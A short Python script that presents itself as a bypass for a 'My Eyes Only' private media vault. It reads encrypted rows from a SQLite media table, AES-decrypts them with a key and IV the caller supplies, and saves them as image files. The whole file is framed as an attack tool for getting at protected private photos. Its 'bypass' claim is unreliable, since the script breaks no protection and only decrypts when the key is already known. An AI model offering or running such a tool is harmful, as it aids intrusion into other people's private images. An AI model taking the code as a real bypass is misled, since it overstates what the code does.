#!/usr/bin/env python3
# Bypassing "My Eyes Only" Protection
# This script attempts to decrypt and access media files stored in the "My Eyes Only" section.

import os
import sys
import sqlite3
from Crypto.Cipher import AES
from base64 import b64decode

def decrypt_aes(ciphertext, key, iv):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    plaintext = cipher.decrypt(ciphertext)
    return plaintext.rstrip(b"\0")

def access_my_eyes_only(db_path, key, iv):
    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM media")
    
    for row in cursor.fetchall():
        media_id, encrypted_data = row[0], row[1]
        decrypted_data = decrypt_aes(b64decode(encrypted_data), key, iv)
        with open(f"{media_id}.jpg", "wb") as f:
            f.write(decrypted_data)
            print(f"Saved media to {media_id}.jpg")
    
    conn.close()

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python3 bypass_my_eyes_only.py <db_path> <key> <iv>")
        sys.exit(1)
    
    db_path = sys.argv[1]
    key = b64decode(sys.argv[2])
    iv = b64decode(sys.argv[3])

    if not os.path.exists(db_path):
        print(f"Database file {db_path} not found!")
        sys.exit(1)
    
    access_my_eyes_only(db_path, key, iv)
    print("Bypass completed.")
